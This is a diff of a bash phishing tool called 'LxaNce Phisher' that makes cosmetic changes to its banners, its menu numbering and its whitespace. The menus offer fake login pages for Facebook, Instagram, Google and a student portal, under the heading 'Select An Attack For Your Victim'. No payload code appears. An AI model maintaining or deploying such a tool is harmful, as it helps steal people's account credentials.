@@ -143,10 +143,10 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${GREEN}
-		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-		${GREEN} 	|L|x|a|N|c|e| |P|h|i|s|h|e|r|
-		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-							${RED}Version : 2.2
+		${GREEN} 		+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+		${GREEN} 		|L|x|a|N|c|e| |P|h|i|s|h|e|r|
+		${GREEN} 		+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+		${RED}                                         Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
@@ -159,7 +159,7 @@ banner_small() {
 		${BLUE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
 		${BLUE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
 		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀
-							${WHITE} 2.2
+		${WHITE}                                2.2
 							
 	EOF
 }
@@ -474,10 +474,10 @@ site_psit() {
 	cat <<-EOF
 	
 		${RED}[${WHITE}01${RED}]${ORANGE} Psit Normal Portal
-		${RED}[${WHITE}01${RED}]${ORANGE} Psitche Normal Portal
-		${RED}[${WHITE}02${RED}]${ORANGE} Increase Presenty
-		${RED}[${WHITE}03${RED}]${ORANGE} Search About Students
-		${RED}[${WHITE}04${RED}]${ORANGE} Advanced Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Psitche Normal Portal
+		${RED}[${WHITE}03${RED}]${ORANGE} Increase Presenty
+		${RED}[${WHITE}04${RED}]${ORANGE} Search About Students
+		${RED}[${WHITE}05${RED}]${ORANGE} Advanced Page
 	
 	EOF
 	
@@ -556,9 +556,9 @@ site_instagram() {
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 
 	EOF
-
+	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
+	
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
@@ -644,7 +644,7 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-
+															
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
